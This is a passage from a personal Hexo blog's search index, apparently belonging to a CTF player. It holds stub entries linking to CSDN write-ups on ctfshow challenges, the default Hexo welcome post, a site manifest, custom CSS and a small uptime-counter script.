        <content type="html"><![CDATA[<p>之前也是写在了csdn上。</p><p><a href="https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298">https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow命令执行 刷题记录</title>
      <link href="/posts/ae291e13.html"/>
      <url>/posts/ae291e13.html</url>
      
        <content type="html"><![CDATA[<p>之前写在了csdn上</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128285071">https://blog.csdn.net/qq_63548648/article/details/128285071</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow信息收集 刷题记录</title>
      <link href="/posts/de341b7.html"/>
      <url>/posts/de341b7.html</url>
      
        <content type="html"><![CDATA[<p>之前也是写在了csdn.</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128244465">https://blog.csdn.net/qq_63548648/article/details/128244465</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow爆破 刷题记录</title>
      <link href="/posts/1a5a0558.html"/>
      <url>/posts/1a5a0558.html</url>
      
        <content type="html"><![CDATA[<p>之前没建博客之前，写在了csdn,所以这里就直接用csdn的链接了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_63548648/article/details/128276536</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="../images/image-20221226161738079.png" alt="image-20221226161738079"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"ke1nys`Blog","short_name":"ke1nys","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/siteicon/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/siteicon/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/siteicon/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/siteicon/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/siteicon/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/siteicon/144.png","sizes":"144x144","type":"image/png"},{"src":"/img/siteicon/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {    font-family: ZhuZiAYuanJWD;    src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);    font-display: swap;    font-weight: lighter;  }    div#menus {    font-family: "ZhuZiAYuanJWD";  }  h1#site-title {    font-family: ZhuZiAYuanJWD;    font-size: 3em !important;  }  a.article-title,  a.blog-slider__title,  a.categoryBar-list-link,  h1.post-title {    font-family: ZhuZiAYuanJWD;  }    .iconfont {    font-family: "iconfont" !important;    font-size: 3em;    /* 可以定义图标大小 */    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    /* 时间轴生肖icon */  svg.icon {    /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */    width: 1em;    height: 1em;    /* width和height定义图标的默认宽度和高度*/    vertical-align: -0.15em;    fill: currentColor;    overflow: hidden;  }    .icon-zhongbiao::before {    color: #f7c768;  }    /* bilibli番剧插件 */  #article-container .bangumi-tab.bangumi-active {    background: var(--anzhiyu-theme);    color: var(--anzhiyu-ahoverbg);    border-radius: 10px;  }  a.bangumi-tab:hover {    text-decoration: none !important;  }  .bangumi-button:hover {    background: var(--anzhiyu-theme) !important;    border-radius: 10px !important;    color: var(--anzhiyu-ahoverbg) !important;  }  a.bangumi-button.bangumi-nextpage:hover {    text-decoration: none !important;  }  .bangumi-button {    padding: 5px 10px !important;  }    a.bangumi-tab {    padding: 5px 10px !important;  }  svg.icon.faa-tada {    font-size: 1.1em;  }  .bangumi-info-item {    border-right: 1px solid #f2b94b;  }  .bangumi-info-item span {    color: #f2b94b;  }  .bangumi-info-item em {    color: #f2b94b;  }    /* 解决artitalk的图标问题 */  #uploadSource > svg {    width: 1.19em;    height: 1.5em;  }    /*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */  #page-header:not(.not-top-img):before {    background-color: transparent !important;  }    /* 首页文章卡片 */  #recent-posts > .recent-post-item {    background: rgba(255, 255, 255, 0.9);  }    /* 首页侧栏卡片 */  #aside-content .card-widget {    background: rgba(255, 255, 255, 0.9);  }    /* 文章页面正文背景 */  div#post {    background: rgba(255, 255, 255, 0.9);  }    /* 分页页面 */  div#page {    background: rgba(255, 255, 255, 0.9);  }    /* 归档页面 */  div#archive {    background: rgba(255, 255, 255, 0.9);  }    /* 标签页面 */  div#tag {    background: rgba(255, 255, 255, 0.9);  }    /* 分类页面 */  div#category {    background: rgba(255, 255, 255, 0.9);  }    /*夜间模式伪类遮罩层透明*/  [data-theme="dark"] #recent-posts > .recent-post-item {    background: #121212;  }    [data-theme="dark"] .card-widget {    background: #121212 !important;  }    [data-theme="dark"] div#post {    background: #121212 !important;  }    [data-theme="dark"] div#tag {    background: #121212 !important;  }    [data-theme="dark"] div#archive {    background: #121212 !important;  }    [data-theme="dark"] div#page {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: transparent !important;  }  /* 页脚透明 */  #footer {    background: transparent !important;  }    /* 头图透明 */  #page-header {    background: transparent !important;  }    #rightside > div > button {    border-radius: 5px;  }    /* 滚动条 */    ::-webkit-scrollbar {    width: 10px;    height: 10px;  }    ::-webkit-scrollbar-thumb {    background-color: #3b70fc;    border-radius: 2em;  }    ::-webkit-scrollbar-corner {    background-color: transparent;  }    ::-moz-selection {    color: #fff;    background-color: #3b70fc;  }    /* 音乐播放器 */    /* .aplayer .aplayer-lrc {    display: none !important;  } */    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    transition: all 0.3s;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    transition: all 0.3s;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }    .aplayer.aplayer-fixed {    z-index: 999999 !important;  }    /* 评论框  */  .vwrap {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 30px 0px;  }    /* 设置评论框 */    .vcard {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 0px 0px;  }    /* 鼠标图标 */  body {    cursor: url("/img/x1.cur"), auto;  }  a,  [type="button"]:not(:disabled),  [type="reset"]:not(:disabled),  [type="submit"]:not(:disabled),  button:not(:disabled) {    cursor: url("/img/x2.cur"), auto !important;  }  /* md网站下划线 */  #article-container a:hover {    text-decoration: none !important;  }    #article-container #hpp_talk p img {    display: inline;  }    /* 404页面 */  #error-wrap {    position: absolute;    top: 40%;    right: 0;    left: 0;    margin: 0 auto;    padding: 0 1rem;    max-width: 1000px;    transform: translate(0, -50%);  }    #error-wrap .error-content {    display: flex;    flex-direction: row;    justify-content: center;    align-items: center;    margin: 0 1rem;    height: 18rem;    border-radius: 8px;    background: var(--card-bg);    box-shadow: var(--card-box-shadow);    transition: all 0.3s;  }    #error-wrap .error-content .error-img {    box-flex: 1;    flex: 1;    height: 100%;    border-top-left-radius: 8px;    border-bottom-left-radius: 8px;    background-color: #3b70fc;    background-position: center;    background-size: cover;  }    #error-wrap .error-content .error-info {    box-flex: 1;    flex: 1;    padding: 0.5rem;    text-align: center;    font-size: 14px;    font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;  }  #error-wrap .error-content .error-info .error_title {    margin-top: -4rem;    font-size: 9em;  }  #error-wrap .error-content .error-info .error_subtitle {    margin-top: -3.5rem;    word-break: break-word;    font-size: 1.6em;  }  #error-wrap .error-content .error-info a {    display: inline-block;    margin-top: 0.5rem;    padding: 0.3rem 1.5rem;    background: var(--btn-bg);    color: var(--btn-color);  }    #body-wrap.error .aside-list {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    bottom: 0px;    position: absolute;    padding: 1rem;    width: 100%;    overflow: scroll;  }    #body-wrap.error .aside-list .aside-list-group {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    max-width: 1200px;    margin: 0 auto;  }    #body-wrap.error .aside-list .aside-list-item {    padding: 0.5rem;  }    #body-wrap.error .aside-list .aside-list-item img {    width: 100%;    object-fit: cover;    border-radius: 12px;  }    #body-wrap.error .aside-list .aside-list-item .thumbnail {    overflow: hidden;    width: 230px;    height: 143px;    background: var(--anzhiyu-card-bg);    display: flex;  }    #body-wrap.error .aside-list .aside-list-item .content .title {    -webkit-line-clamp: 2;    overflow: hidden;    display: -webkit-box;    -webkit-box-orient: vertical;    line-height: 1.5;    justify-content: center;    align-items: flex-end;    align-content: center;    padding-top: 0.5rem;    color: white;  }    #body-wrap.error .aside-list .aside-list-item .content time {    display: none;  }    /* 代码框主题 */  #article-container figure.highlight {    border-radius: 10px;  }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.min.js"/>
      <url>/js/runtime/runtime.min.js</url>
      
        <content type="html"><![CDATA[var now=new Date;function createtime(){var t=new Date("12/16/2022 00:00:00");now.setTime(now.getTime()+250);var e=(now-t)/1e3/60/60/24,a=Math.floor(e),n=(now-t)/1e3/60/60-24*a,r=Math.floor(n);1==String(r).length&&(r="0"+r);var s=(now-t)/1e3/60-1440*a-60*r,i=Math.floor(s);1==String(i).length&&(i="0"+i);var o=(now-t)/1e3-86400*a-3600*r-60*i,l=Math.round(o);1==String(l).length&&(l="0"+l);let g="";g=r<18&&r>=9?`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`:`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=g)}setInterval(()=>{createtime()},250);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.js"/>
      <url>/js/runtime/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { var t = new Date("12/16/2022 00:00:00"); now.setTime(now.getTime() + 250); var e = (now - t) / 1e3 / 60 / 60 / 24, a = Math.floor(e), n = (now - t) / 1e3 / 60 / 60 - 24 * a, r = Math.floor(n); 1 == String(r).length && (r = "0" + r); var s = (now - t) / 1e3 / 60 - 1440 * a - 60 * r, i = Math.floor(s); 1 == String(i).length && (i = "0" + i); var o = (now - t) / 1e3 - 86400 * a - 3600 * r - 60 * i, l = Math.round(o); 1 == String(l).length && (l = "0" + l); let g = ""; g = r < 18 && r >= 9 ? `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>` : `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = g) } setInterval((() => { createtime() }), 250);]]></content>
      
    </entry>
    
    
  
</search>
